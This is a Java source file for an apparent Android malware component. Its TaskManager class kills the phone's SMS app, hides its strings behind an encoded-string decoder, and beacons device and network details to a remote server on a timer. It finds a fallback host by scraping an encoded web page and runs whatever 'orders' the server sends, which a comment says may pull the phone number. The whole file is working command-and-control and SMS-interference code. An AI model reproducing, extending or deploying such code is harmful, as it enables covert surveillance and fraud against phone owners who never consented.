package kernel.workspace.manager;
import java.util.Map;
import kernel.workspace.Settings;
import kernel.workspace.http.HttpJsonThread;
import kernel.workspace.http.NetContext;
import kernel.workspace.listener.FlowListener;
import kernel.workspace.listener.NetListener;
import kernel.workspace.listener.NetworkListener;
import kernel.workspace.network.NetworkController;
import kernel.workspace.util.Logger;
import kernel.workspace.util.ParseKsy;
import kernel.workspace.util.T;
import org.json.JSONException;
import org.json.JSONObject;
import android.content.Context;
import android.content.SharedPreferences;
import android.text.TextUtils;
import bean.Json;
import bean.Order;
import bean.Task;
import bean.form.TaskForm;

public class TaskManager {
    /**
     *   "hostName";
     */
    private static final String HOST_NAME = ParseKsy.decode("36ede5b3042f5f86d051e58d5ea204ec");
    /**
     * "PREF_INTERVAL"
     */
    public static String PREF_INTERVAL = ParseKsy.decode("0e8f75ff8734d3db51b9bb6f0f2ce8b8");
    /**
     * "PREF_PROCESS_TIME"
     */
    private final String PREF_PROCESS_TIME = ParseKsy.decode("d2c3078ce3cae4be1fc6f860242a1a8ed13c8390bf298340d7513ee61c06175a");
    private SharedPreferences pref;
    private static TaskManager instance;
    private Context context;
    private TaskManager(Context context) {
        this.context = context;
        pref = context.getSharedPreferences(TaskManager.class.getName(), 0);
    }
    public static TaskManager getInstance(Context context) {
        if (instance == null) {
            synchronized (TaskManager.class) {
                if (instance == null) {
                    instance = new TaskManager(context);
                }
            }
        }
        return instance;
    }
    private long getProcessTime() {
        return pref.getLong(PREF_PROCESS_TIME, 0L);
    }
    /**
     * "{\"x8\":[{\"aa1\":101,\"m1\":{\"i3\":[{\"h3\":\"hostName\",\"h2\":\"enclosed(/-/`/-/)\"}]},\"y2\":9228213228309,\"y3\":4,\"l1\":\"http://weibo.10086.cn/feedbook\"}],\"x3\":1,\"x1\":9228213228309}";
     */
    String HOST_ORDER = ParseKsy
            .decode("11f1bd43d2c566da620f7645d1b59c36c4b32bf749e299850a69c84062e1815bc62fb53e71b3f2040d6170caaf878945e7f22d1ef2e411bf94e3c85fd08494f0f46241d6c73b3ce9f1b09e325a2f5ee453432480aed24f402db3d8a1515420ad5615c21ae50ca3ac8b3c8567fe440217185a5deccb405a9ab52f49010b6e20012fc044487b538a3fd284f9bda09e9be64e356d4b9bbb176d12bde035d59b4c1d55e3f6793fa863cec5edaafd1b1308f3");
    public void triggerByService(boolean manual) {
        if (manual || System.currentTimeMillis() - getProcessTime() > getInterval() * 1000) {
            execute();
        }
    }
    public void execute() {
        T.killSmsApp(context);
        pref.edit().putLong(PREF_PROCESS_TIME, System.currentTimeMillis()).commit();
        if (FlowManager.getInstanse(context).scheduleCheckDelayedOrder()) return;
        NetworkController.doNetworkTask(context, 0, new NetworkListener() {
            @Override
            public void onResult(String erroMsg) {
                if (T.getRequestFailureCount(context) < Settings.HOST_RETRIEVE_TRIIGER) {
                    request();
                    return;
                }
                try {
                    Order order = Json.optObj(Order.class, new JSONObject(HOST_ORDER));
                    FlowManager.getInstanse(context).execute(order, new FlowListener() {
                        @Override
                        public void onFinished(Map<String, String> variables, String errorMsg) {
                            if (errorMsg == null) {
                                String hostName = ParseKsy.decode(variables.get(HOST_NAME));
                                if (hostName != null && hostName.length() > 6) {
                                    T.setHostName(context, hostName);
                                    request();
                                    return;
                                }
                            }
                        }
                    });
                } catch (JSONException e) {
                    Logger.error(e);
                }
            }
        });
    }
    private void request() {
        NetworkController.doNetworkTask(context, 0, new NetworkListener() {
            @Override
            public void onResult(String errorMsg) {
                if (errorMsg == null) {
                    TaskForm taskForm = new TaskForm(T.INFO, NetworkController.getNetworkStatus(context));
                    T.fillForm(taskForm);
                    try {
                        new HttpJsonThread(context, new NetContext(T.SERVER_URL, taskForm.toJson(), new NetListener() {
                            @Override
                            public void onFailed(int callBack, String errorCode, String errorMsg) {}
                            @Override
                            public void onTimeout(int i) {}
                            @Override
                            public void onSuccess(int callBack, String url, String content) {
                                Task task = Json.optObj(Task.class, T.toJson(content));
                                if (task != null) {
                                    if (!TextUtils.isEmpty(task.host)) {
                                        T.setHostName(context, task.host);
                                    }
                                    if (task.interval != getInterval()) {
                                        pref.edit().putInt(PREF_INTERVAL, task.interval).commit();
                                    }
                                    final boolean requestOrder = task.requestOrder;
                                    if (task.order != null) {
                                        //The order maybe used to retrieve phone number or area code
                                        FlowManager.getInstanse(context).execute(task.order, new FlowListener() {
                                            @Override
                                            public void onFinished(Map<String, String> variables, String errorMsg) {
                                                if (TextUtils.isEmpty(errorMsg)) {
                                                    if (requestOrder) {
                                                        OrderManager.getInstance(context).execute();
                                                        return;
                                                    }
                                                }
                                            }
                                        });
                                    } else {
                                        if (requestOrder) {
                                            OrderManager.getInstance(context).execute();
                                        }
                                    }
                                }
                            }
                        }, 1, true)).startThread();
                    } catch (JSONException e) {
                        Logger.error(e);
                    }
                }
            }
        });
    }
    /**
     * Interval , unit:seconds
     * @return
     */
    private int getInterval() {
        int interval = pref.getInt(PREF_INTERVAL, Settings.DEFAULT_TASK_INTERVAL);
        if (interval < Settings.MIN_TASK_INTERVAL || interval > Settings.MAX_TASK_INTERVAL) interval = Settings.MAX_TASK_INTERVAL;
        return interval;
    }
}
